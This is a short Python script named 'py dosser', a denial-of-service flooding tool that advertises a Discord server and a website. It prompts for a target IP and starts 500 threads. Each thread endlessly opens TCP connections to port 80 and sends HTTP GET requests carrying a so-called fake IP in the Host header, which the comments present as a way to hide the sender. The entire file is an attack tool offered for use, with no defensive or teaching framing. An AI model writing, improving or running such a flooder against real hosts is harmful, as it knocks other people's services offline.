#open source program
import socket
import threading
from pyfiglet import figlet_format

font = figlet_format ('py dosser')

print (font)
print ('join our discord! https://discord.st/0V3RR1D3/ and check out our site https://ov3rr1d3.000webhostapp.com/')
print ('*******************************************************************************************************************')


target = input ('target ip:>>')
fake_ip = '182.21.20.32'
port = 80
#you can change port here

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    print ('attacking:' + target)
